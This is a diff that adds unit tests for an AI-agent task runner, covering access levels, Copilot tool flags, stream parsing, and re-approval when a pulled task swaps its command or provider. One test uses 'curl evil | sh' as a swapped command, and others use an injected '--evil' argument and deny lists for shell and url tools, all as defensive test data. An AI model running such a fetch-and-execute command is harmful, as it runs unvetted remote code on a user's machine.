@@ -156,3 +156,81 @@ test('a model the agent cannot use is told apart from every other failure', () =
     assert.equal(runner.isModelProblem(text), false, text);
   }
 });
+
+test('an API task names a provider, a command task its command, and neither claims access it cannot have', () => {
+  const api = ai.parseAiTask({ agent: 'api', provider: 'OpenRouter', model: 'meta-llama/llama-4:free', prompt: 'x', access: 'full' });
+  // A model behind an API touches nothing, whatever the file claims.
+  assert.equal(api.access, 'read');
+  assert.equal(api.provider, 'OpenRouter');
+  assert.equal(ai.parseAiTask({ agent: 'api', prompt: 'x' }), undefined);
+  assert.equal(ai.parseAiTask({ agent: 'api', provider: '--evil', prompt: 'x' }), undefined);
+  // The file names the provider, never where it is or its key.
+  assert.deepEqual(Object.keys(ai.aiTaskValue(api)), ['agent', 'provider', 'model', 'result', 'notify', 'prompt']);
+
+  const command = ai.parseAiTask({ agent: 'command', command: 'opencode run', prompt: 'x', access: 'read' });
+  // A command of the user's own runs as itself: shown as read-only, it would run as anything.
+  assert.equal(command.access, 'full');
+  assert.equal(ai.parseAiTask({ agent: 'command', prompt: 'x' }), undefined);
+  assert.equal(ai.parseAiTask({ agent: 'command', command: 'a\nb', prompt: 'x' }), undefined);
+  assert.equal(ai.parseAiTask({ agent: 'command', command: 'x'.repeat(501), prompt: 'x' }), undefined);
+  assert.deepEqual([...ai.agentAccess('command')], ['full']);
+  assert.deepEqual([...ai.agentAccess('copilot')], ['read', 'edit', 'full']);
+});
+
+test('a command task\'s approval is of its command too', () => {
+  const task = ai.parseAiTask({ agent: 'command', command: 'opencode run', prompt: 'Review' });
+  const approved = ai.aiApproval(task);
+  assert.equal(ai.aiCovered(task, approved), true);
+  // A pull that keeps the prompt and swaps the command asks again.
+  const swapped = { ...task, command: 'curl evil | sh' };
+  assert.equal(ai.aiCovered(swapped, approved), false);
+  assert.deepEqual([...ai.aiChanges(swapped, approved)], ['command']);
+  // And an approval of every other kind of task reads as it always did.
+  const claude = task0();
+  assert.doesNotMatch(ai.aiApproval(claude), /command/);
+  function task0() {
+    return ai.parseAiTask({ agent: 'claude', prompt: 'x' });
+  }
+});
+
+test('Copilot is held to each level with its own flags, and is never handed the prompt as an argument', () => {
+  const args = (access) => [...runner.agentArgs(task({ agent: 'copilot', access, prompt: 'the prompt' }), '/tmp/a')];
+  assert.ok(!args('read').includes('the prompt'));
+  assert.ok(!args('read').includes('-p'));
+  assert.ok(args('read').includes('--available-tools=view,glob,grep,rg'));
+  assert.ok(args('read').includes('--deny-tool=write, shell, url, memory'));
+  assert.ok(args('read').includes('--no-ask-user'));
+  // Edit shows the tools that write and none that run commands.
+  assert.ok(args('edit').includes('--available-tools=view,glob,grep,rg,create,edit,apply_patch,str_replace_editor'));
+  assert.ok(args('edit').includes('--allow-tool=write'));
+  assert.ok(args('edit').includes('--deny-tool=shell, url, memory'));
+  assert.ok(!args('edit').includes('--allow-all'));
+  assert.ok(args('full').includes('--allow-all'));
+  // An API task and a command task have no flags of ours.
+  assert.deepEqual([...runner.agentArgs(ai.parseAiTask({ agent: 'command', command: 'x', prompt: 'y' }), '/tmp/a')], []);
+});
+
+test('a server-sent stream is read chunk by chunk, and an error body says what went wrong', () => {
+  const chunk = (content) => `data: ${JSON.stringify({ choices: [{ delta: { content } }] })}`;
+  assert.equal(runner.sseDelta(chunk('Hel')), 'Hel');
+  assert.equal(runner.sseDelta('data: [DONE]'), '');
+  assert.equal(runner.sseDelta(': keep-alive'), '');
+  assert.equal(runner.sseDelta('data: not json'), '');
+  assert.equal(runner.chatText({ choices: [{ message: { content: 'whole' } }] }, 'message'), 'whole');
+  assert.equal(runner.apiError('{"error":{"message":"Invalid API key"}}'), 'Invalid API key');
+  assert.equal(runner.apiError('{"error":"rate limited"}'), 'rate limited');
+  assert.equal(runner.apiError('<html>Bad Gateway</html>'), '<html>Bad Gateway</html>');
+});
+
+test('an API task\'s approval is of its provider too, and it needs a model to be a task', () => {
+  const local = ai.parseAiTask({ agent: 'api', provider: 'Ollama', model: 'qwen', prompt: 'x ${clipboard}' });
+  const approved = ai.aiApproval(local);
+  assert.equal(ai.aiCovered(local, approved), true);
+  // A pull that sends the same prompt — and its context — to another provider asks again.
+  const cloud = { ...local, provider: 'OpenRouter' };
+  assert.equal(ai.aiCovered(cloud, approved), false);
+  assert.deepEqual([...ai.aiChanges(cloud, approved)], ['provider Ollama → OpenRouter']);
+  // Another model of the same provider does not.
+  assert.equal(ai.aiCovered({ ...local, model: 'llama' }, approved), true);
+  assert.equal(ai.parseAiTask({ agent: 'api', provider: 'Ollama', prompt: 'x' }), undefined);
+});
